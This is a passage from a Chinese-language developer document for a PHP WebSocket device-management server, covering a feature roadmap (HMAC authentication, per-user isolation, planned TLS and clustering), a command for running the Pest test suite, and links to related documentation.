$connectionManager->getDeviceCount();      // 设备数
$connectionManager->getPanelCount();       // 面板数
```

---

## 后续优化计划

- [x] 推送模式 (设备上线/离线实时推送)
- [x] 设备自动注册 (首次上线自动创建数据库记录)
- [x] 用户隔离 (普通用户只收到自己设备的推送)
- [x] 修复多 Worker 跨进程通信问题 (改为单 Worker 模式)
- [x] 设备连接认证 (HMAC token，APK 构建时签名)
- [x] Panel 连接认证 (HMAC token，HTTP 端生成，subscribe/join 时验证)
- [x] 设备权限校验 (普通用户只能控制自己的设备，管理员可控制所有设备)
- [x] 移除旧 usercheck 字段 (md5(email+app_key) 已废弃)
- [ ] SSL/TLS 支持 (wss://)
- [ ] Prometheus 监控指标
- [ ] 多 Worker 支持 (Redis Pub/Sub 或 Swoole Task Worker)
- [ ] 集群部署支持 (多节点 + Redis)

---

## 功能测试

WebSocket 功能测试使用**测试专用服务器**和**随机端口**，避免与开发环境冲突：

```bash
cd app
./vendor/bin/sail pest tests/Feature/WebSocket/
```

详见 [app/tests/Feature/WebSocket/README.md](../../app/tests/Feature/WebSocket/README.md)。

---

## 相关文档

- [WEBSOCKET_SERVER.md](../WEBSOCKET_SERVER.md) - Node.js 原始实现分析
- [WEBSOCKET_CLIENT.md](./WEBSOCKET_CLIENT.md) - 前端客户端实现
- [WEBSOCKET_TESTING.md](./WEBSOCKET_TESTING.md) - 测试套件文档
- [DEVELOPMENT.md](./DEVELOPMENT.md) - 开发环境配置
